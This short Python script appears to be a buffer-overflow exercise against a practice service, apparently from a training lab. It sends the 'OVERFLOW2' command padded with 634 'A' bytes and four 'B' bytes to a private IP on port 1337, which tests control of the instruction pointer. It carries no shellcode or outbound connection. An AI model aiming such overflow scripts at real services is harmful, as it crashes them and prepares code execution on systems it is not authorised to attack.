import time,sys,socket
offset = 634
ip = '10.10.231.163'
port = 1337
payload = b"OVERFLOW2 " + b"A" * offset + b"B" * 4

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip,port))
    s.send((payload + b'\r\n'))
    s.close()
    print("Done")
except:
    print("Cannot connect to client")
    
